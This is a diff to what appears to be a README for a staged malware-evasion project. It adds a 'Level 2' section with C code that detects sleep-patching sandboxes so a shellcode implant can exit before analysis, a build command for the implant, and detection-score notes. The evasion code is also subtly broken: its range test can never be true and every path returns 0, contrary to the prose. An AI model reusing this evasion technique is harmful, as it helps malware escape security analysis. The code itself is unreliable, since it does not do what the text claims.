@@ -219,3 +219,46 @@ The encryprion does bring down the detection rates a bittle but still, there are
 [**Antiscan Score: x/26**]()
 
 ![Level1 Analysis]()
+
+## Level 2 - Sleep Patching Sandbox
+
+Taking a short detour from the usual from playing with the shell code, we try and implement some sandbox detection techiniques, starting off with ***"Sleep Patching Sandboxes"***. Accoring to [ICASA](www.isaca.org):
+
+> “Sleep Patching Sandboxes will patch the sleep function to try to outmaneuver malware that uses time delays. In response, malware will check to see if time was accelerated. Malware will get the timestamp, go to sleep and then again get the timestamp when it wakes up. The time difference between the timestamps should be the same duration as the amount of time the malware was programmed to sleep. If not, then the malware knows it is running in an environment that is patching the sleep function, which would only happen in a sandbox.” 
+
+Thus to bypass this, we implement the following function in `sandbox.h` to check for accelerated time:
+
+```c
+/// User defined PPDs
+#define L_INTERVAL  950    // Lower Time Limit
+#define INTERVAL    1000   // Mean  Time Limit
+#define U_INTERVAL  1050   // Upper Time Limit
+
+int __check_sleep_patch(){
+    DWORD startCount = GetTickCount();
+    Sleep(INTERVAL);
+    DWORD endCount = GetTickCount();
+
+    DWORD timeSpan = endCount - startCount;
+    if ((L_INTERVAL > timeSpan) && (timeSpan > U_INTERVAL)){
+        return 0;
+    }
+    
+    return 0;
+}
+```
+
+Thus if the sandbox is accelerating time, then the `timeSpan` value wouldn't be in the range `L_INTERVAL` and `U_INTERVAL`, hence signifying that the program is running in a sandbox, thereby prompting the program to exit without executing any shellcode in order to avoid detection.
+
+The program is compiled with:
+```c
+cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /I "headers" /link /OUT:executables\level2.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
+```
+
+### Antiscan Analysis
+
+Okay, so this did not help much with the detection rates but nevertheless, is a good place to start with sandbox evasion techniques. 
+
+[**Antiscan Score: x/26**]()
+
+![Level2 Analysis]()
